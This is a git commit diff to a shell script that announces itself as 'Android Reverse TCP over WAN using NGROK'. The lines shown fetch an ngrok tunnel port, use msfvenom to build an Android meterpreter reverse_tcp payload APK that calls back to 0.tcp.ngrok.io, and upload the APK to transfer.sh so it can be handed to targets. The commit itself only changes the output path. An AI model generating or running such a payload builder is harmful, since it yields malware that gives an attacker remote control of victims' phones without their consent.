aa7d0580254ea4364e26ba4ee6cba9cd5ad25165
Arun Chaudhary <arun.11601678@lpu.in>
2018-02-12 16:19:25 +0530

    Update linux.sh

--- linux.sh
+++ linux.sh
@@ -5,7 +5,7 @@ printf "\033[1;31m*** Android Reverse TCP over WAN using NGROK ***\033[0m\n"
 echo -e "\t*** https://github.com/its-arun ***"
 sleep 3.5;
 rport=$( curl -sS http://localhost:4040/api/tunnels | jq '.tunnels[0].public_url' | cut -d ":" -f 3 | sed 's/\"//g' );
-msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$rport R >/Users/arun/apkrat/payload.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$rport R >$(pwd)/payload.apk
 echo "Payload Generated";
 ulink=$( curl -sS --upload-file ./payload.apk https://transfer.sh/payload.apk );
 echo "Payload APK uploaded at " $ulink;
